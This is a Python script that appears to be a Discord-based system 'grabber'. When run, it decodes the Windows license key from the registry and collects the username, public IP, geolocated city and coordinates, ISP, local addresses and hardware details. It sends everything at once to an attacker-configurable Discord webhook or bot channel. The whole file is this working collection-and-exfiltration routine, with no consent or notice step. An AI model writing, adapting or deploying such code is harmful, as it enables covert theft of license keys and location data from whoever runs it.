import discord
from discord.ext import commands
import requests
import socket
import platform
import psutil
import cpuinfo
import subprocess
import os
import json
import getpass
import winreg

possible_paths = [
    os.path.join(os.path.dirname(__file__), "cfg", "config.txt"),
    os.path.join(os.path.dirname(__file__), "..", "cfg", "config.txt"),
    os.path.join(os.path.dirname(__file__), "..", "..", "cfg", "config.txt")
]

CONFIG_PATH = None
for path in possible_paths:
    if os.path.exists(path):
        CONFIG_PATH = path
        break

if CONFIG_PATH is None:
    raise FileNotFoundError("ERROR config.txt.")

config = {}
with open(CONFIG_PATH, encoding="utf-8") as f:
    for line in f:
        if "=" in line:
            key, value = line.strip().split("=", 1)
            config[key] = value

TOKEN = config.get("DISCORD_TOKEN")
CHANNEL_ID = int(config.get("DISCORD_CHANNEL_ID", 0))
WEBHOOK_URL = config.get("WEBHOOK_URL")
OUTPUT_MODE = config.get("OUTPUT_MODE", "bot").lower()

def get_windows_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        value, _ = winreg.QueryValueEx(key, "DigitalProductId")
        winreg.CloseKey(key)

        def decode_product_key(digital_product_id):
            key_offset = 52
            is_win8 = (digital_product_id[66] // 6) & 1
            key_chars = "BCDFGHJKMPQRTVWXY2346789"
            decode_length = 25
            decode_string_length = 29
            decoded_chars = [""] * decode_string_length
            hex_digits = list(digital_product_id)

            if is_win8:
                key_offset = 52
                last = 0
                for i in range(decode_length):
                    current = 0
                    for j in range(14, -1, -1):
                        current = current * 256
                        current = hex_digits[j + key_offset] + current
                        hex_digits[j + key_offset] = current // 24
                        current %= 24
                        last = current
                    decoded_chars[decode_length - i - 1] = key_chars[current]
                return "".join(decoded_chars)
            else:
                for i in range(decode_length):
                    current = 0
                    for j in range(14, -1, -1):
                        current = current * 256
                        current = hex_digits[j + key_offset] + current
                        hex_digits[j + key_offset] = current // 24
                        current %= 24
                    decoded_chars[decode_length - i - 1] = key_chars[current]
                for i in range(5, decode_string_length, 6):
                    decoded_chars.insert(i, "-")
                return "".join(decoded_chars)

        return decode_product_key(value)
    except Exception as e:
        return f"Error: {e}"

def get_public_ip():
    services = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://api.myip.com"
    ]
    for url in services:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                if "myip.com" in url:
                    return r.json().get("ip")
                return r.text.strip()
        except:
            continue
    return "Unknown"

def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,as", timeout=5).json()
        if r["status"] == "success":
            return r
    except:
        pass
    return None

def get_local_ips():
    addrs = psutil.net_if_addrs()
    ipv4s = {}
    for iface, info_list in addrs.items():
        for info in info_list:
            if info.family == socket.AF_INET:
                ipv4s[iface] = info.address
    return ipv4s

def get_cpu_name():
    try:
        return cpuinfo.get_cpu_info()["brand_raw"]
    except:
        return platform.processor()

def get_gpu_names():
    gpus = []
    try:
        result = subprocess.check_output("wmic path win32_VideoController get Name", shell=True).decode(errors="ignore").split("\n")
        gpus = [line.strip() for line in result if line.strip() and "Name" not in line]
    except:
        gpus.append("No GPU detected")
    return gpus

def get_ram():
    return round(psutil.virtual_memory().total / (1024**3), 2)

def get_disk():
    return round(psutil.disk_usage("/").total / (1024**3), 2)

def create_report():
    username = getpass.getuser()
    windows_key = get_windows_key()
    public_ip = get_public_ip()
    location = get_location(public_ip)
    local_ips = get_local_ips()
    cpu = get_cpu_name()
    gpus = get_gpu_names()
    ram = get_ram()
    disk = get_disk()
    system_info = platform.platform()

    report = f"**System & Network Report (local machine)**\n"
    report += f"👤 **Username:** `{username}`\n"
    report += f"🔑 **Windows License Key:** `{windows_key}`\n"
    report += f"🌐 **Public IP:** `{public_ip}`\n"

    if location:
        report += f"📍 **Approximate Location:** {location['city']}, {location['regionName']}, {location['country']}\n"
        report += f"📌 **Coordinates:** {location['lat']}, {location['lon']}\n"
        report += f"🏢 **ISP:** {location['isp']}\n"
        report += f"🏛 **Org/AS:** {location['org']} / {location['as']}\n"

    report += f"\n💻 **Local IPv4 Addresses:**\n"
    for iface, ip in local_ips.items():
        report += f"• {iface}: {ip}\n"

    report += f"\n🖥 **System:** {system_info}\n"
    report += f"⚙ **CPU:** {cpu}\n"
    report += f"💾 **RAM:** {ram} GB\n"
    report += f"💽 **Disk (system):** {disk} GB\n"

    if gpus:
        report += f"🎮 **GPU(s):**\n"
        for gpu in gpus:
            report += f"• {gpu}\n"

    return report

def send_webhook(msg):
    payload = {"content": msg}
    r = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
    print("Sent via webhook:", r.status_code)

message_content = create_report()

if OUTPUT_MODE == "webhook":
    send_webhook(message_content)
else:
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        channel = bot.get_channel(CHANNEL_ID)
        await channel.send(message_content)
        await bot.close()

    bot.run(TOKEN)
